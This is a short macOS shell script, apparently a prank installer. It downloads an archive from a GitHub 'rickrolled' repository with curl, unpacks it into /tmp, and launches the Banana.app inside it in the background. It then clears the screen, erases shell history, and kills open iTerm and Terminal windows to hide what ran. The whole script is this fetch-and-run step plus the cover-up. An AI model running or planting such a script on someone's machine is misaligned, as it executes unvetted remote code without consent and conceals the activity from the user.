mkdir -p /tmp/felhita/

curl -sL https://github.com/fel-hita/rickrolled/blob/master/Rickroll.tar.gz?raw=true -o /tmp/felhita/Rickroll.tar.gz

tar -xvf /tmp/felhita/Rickroll.tar.gz -C /tmp/felhita
nohup open /tmp/felhita/Banana.app

clear
history -c

killall iTerm
killall Terminal
killall iTerm2
